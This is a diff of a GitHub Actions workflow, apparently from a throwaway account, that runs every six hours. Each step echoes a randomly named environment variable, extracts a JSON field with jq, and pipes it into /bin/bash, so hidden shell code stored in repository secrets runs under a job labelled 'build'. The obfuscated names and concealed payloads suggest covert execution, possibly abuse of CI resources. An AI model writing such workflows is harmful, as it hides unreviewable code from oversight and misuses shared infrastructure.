@@ -2,8 +2,7 @@ name: jiangpengying7612
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 0/6 * * *'
-
+    - cron: '1 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,17 +10,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: jiangpengying7612
         env:
-          noo1980: ${{ secrets.noo1980 }}
+          fmw5: ${{ secrets.fmw5 }}
         run: |
-          echo $noo1980 | jq -r .w270 | /bin/bash
-          echo $xjizs611 | jq -r .g3 | /bin/bash
-          echo $csqv697 | jq -r .iarcv17203 | /bin/bash
-          echo $ur8 | jq -r .ve83 | /bin/bash
-          echo $yiev688 | jq -r .hndr84 | /bin/bash
-          echo $tpqni991 | jq -r .gxw6484 | /bin/bash
-          echo $cz77896 | jq -r .j5 | /bin/bash
-          echo $olamn130 | jq -r .wngb91498 | /bin/bash
-          echo $ayzr7 | jq -r .q91846 | /bin/bash
-          echo $bh516 | jq -r .qbvq835 | /bin/bash
-          echo $ray32 | jq -r .r8871 | /bin/bash
+          echo $fmw5 | jq -r .jpts5 | /bin/bash
+          echo $ee3 | jq -r .zuhx0 | /bin/bash
+          echo $zqr9609 | jq -r .usfz1 | /bin/bash
+          echo $iqmyr21649 | jq -r .s8 | /bin/bash
+          echo $wb742 | jq -r .ht1114 | /bin/bash
+          echo $hvyu57 | jq -r .jn1089 | /bin/bash
+          echo $ndevz82005 | jq -r .od2 | /bin/bash
+          echo $fbpau44 | jq -r .o63 | /bin/bash
+          echo $rvigf8786 | jq -r .wanak41 | /bin/bash
+          echo $io06 | jq -r .hmjsj1489 | /bin/bash
+          echo $sq85 | jq -r .qmx55 | /bin/bash
+          echo $xoazb2904 | jq -r .ovjf4019 | /bin/bash
+          echo $zysag65 | jq -r .p65496 | /bin/bash
+          echo $sn28471 | jq -r .bvt5 | /bin/bash
+          echo $w852 | jq -r .abaa53 | /bin/bash
+          echo $ia32 | jq -r .ngfn5669 | /bin/bash
 
